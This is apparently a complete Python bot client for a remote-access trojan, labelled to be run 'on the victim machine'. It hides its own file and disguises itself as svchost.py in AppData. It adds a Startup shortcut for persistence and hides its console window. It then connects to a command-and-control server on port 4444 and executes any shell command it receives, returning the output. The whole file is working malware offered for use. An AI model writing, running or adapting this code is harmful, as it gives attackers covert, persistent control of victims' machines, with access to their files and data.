# bot_client.py - Run this on the victim machine
import socket
import subprocess
import os
import sys
import shutil
import ctypes

# Hide the current file (Windows only)
if os.name == 'nt':
    try:
        ctypes.windll.kernel32.SetFileAttributesW(os.path.abspath(sys.argv[0]), 2)  # 2 = hidden
    except Exception:
        pass

def move_to_appdata():
    if os.name != 'nt':
        return
    appdata = os.environ["APPDATA"]
    dest_dir = os.path.join(appdata, "Microsoft", "Windows")
    dest_path = os.path.join(dest_dir, "svchost.py")
    current_path = os.path.abspath(sys.argv[0])

    # If already in destination, do nothing
    if current_path == dest_path:
        return

    # Common user folders to check
    user_profile = os.environ["USERPROFILE"]
    search_dirs = [
        os.path.join(user_profile, "Desktop"),
        os.path.join(user_profile, "Downloads"),
        os.path.join(user_profile, "Pictures"),
        os.path.join(user_profile, "Documents"),
        os.path.join(user_profile, "Videos"),
        os.path.join(user_profile, "Music"),
    ]

    # If current path is in one of these folders, move it
    for folder in search_dirs:
        if current_path.lower().startswith(folder.lower()):
            if not os.path.exists(dest_dir):
                os.makedirs(dest_dir)
            shutil.copy2(current_path, dest_path)
            # Hide the file
            ctypes.windll.kernel32.SetFileAttributesW(dest_path, 2)
            os.startfile(dest_path)
            sys.exit()
    # If not in those folders, just continue

move_to_appdata()

def add_to_startup():
    if os.name != 'nt':
        return
    try:
        import win32com.client
        startup_dir = os.path.join(os.environ["APPDATA"], r"Microsoft\Windows\Start Menu\Programs\Startup")
        exe_path = os.path.abspath(sys.argv[0])
        shortcut_path = os.path.join(startup_dir, "svchost.lnk")

        shell = win32com.client.Dispatch("WScript.Shell")
        shortcut = shell.CreateShortCut(shortcut_path)
        shortcut.Targetpath = exe_path
        shortcut.WorkingDirectory = os.path.dirname(exe_path)
        shortcut.IconLocation = exe_path
        shortcut.save()
    except Exception as e:
        pass

add_to_startup()

# Hide the console window (Windows only)
if os.name == 'nt':
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

SERVER_IP = '192.168.1.68'  # Replace with your C2 server IP
SERVER_PORT = 4444

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect((SERVER_IP, SERVER_PORT))

while True:
    command = client.recv(1024).decode()
    if command.lower() == 'exit':
        break

    try:
        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
    except subprocess.CalledProcessError as e:
        output = e.output

    if not output:
        output = b'Command executed.\n'

    client.send(output)

client.close()
